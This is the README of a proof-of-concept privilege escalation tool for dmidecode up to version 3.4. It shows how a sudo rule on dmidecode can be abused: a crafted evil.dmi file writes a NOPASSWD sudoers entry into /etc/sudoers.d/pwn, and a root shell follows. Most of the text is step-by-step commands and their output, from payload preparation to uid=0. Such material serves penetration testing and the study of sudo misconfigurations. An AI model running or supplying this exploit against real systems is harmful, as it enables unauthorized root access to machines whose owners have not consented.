# dmiescalate

> Privilege escalation using dmidecode (<=3.4) on BIOS and UEFI systems.

Inspired by: https://github.com/adamreiser/dmiwrite

## Background
I recently ran into the following issue trying to escalate privileges via `dmidecode` sudo rule using [dmiwrite](https://github.com/adamreiser/dmiwrite):
```bash
$ sudo dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/sudoers.d/pwn
# dmidecode 3.4
# SMBIOS entry point at 0x0efc2000
Found SMBIOS entry point in EFI, reading table from evil.dmi.
mmap: Can't map beyond end of file evil.dmi
```
Due to the presence of `/sys/firmware/efi/systab` on the system `dmidecode` didn't seem to take the paths expected by `dmiwrite`. As a result the crafted `evil.dmi` failed us.
This poc is capable of handling both BIOS and UEFI systems. Set `OFFSET` and `END_PAD` accordingly.

## Usage Example

> Note: The file write always outputs some garbage bytes first. Make sure to add a newline at the beginning of the payload.

Prepare payload:
```bash
$ echo "\nkali ALL=(ALL:ALL) NOPASSWD: ALL" > payload
```
Create `evil.dmi`:
```bash
$ python poc.py payload evil.dmi
Using offset: 0xefc2000
Using end padding size: 0x0
Read 34 bytes from payload file payload
SM:  5F 53 4D 5F 00 1F 02 01 00 00 00 00 00 00 00 80
DMI: 5F 44 4D 49 5F 00 22 00 00 00 00 00 01 00 45 00
Writing 251404320 bytes to evil.dmi
Done!
```
Run `dmidecode`:
```bash
$ sudo dmidecode --no-sysfs -d evil.dmi --dump-bin /etc/sudoers.d/pwn
# dmidecode 3.4
# SMBIOS entry point at 0x0efc2000
Found SMBIOS entry point in EFI, reading table from evil.dmi.
SMBIOS 2.1 present.
1 structures occupying 34 bytes.
Table at 0x00000000.

# Writing 34 bytes to /etc/sudoers.d/pwn.
# Writing 31 bytes to /etc/sudoers.d/pwn.
```
Escalate:
```bash
$ sudo su
/etc/sudoers.d/pwn:1:5: syntax error
_SM_
   ^
$ id
uid=0(root) gid=0(root) groups=0(root)
```
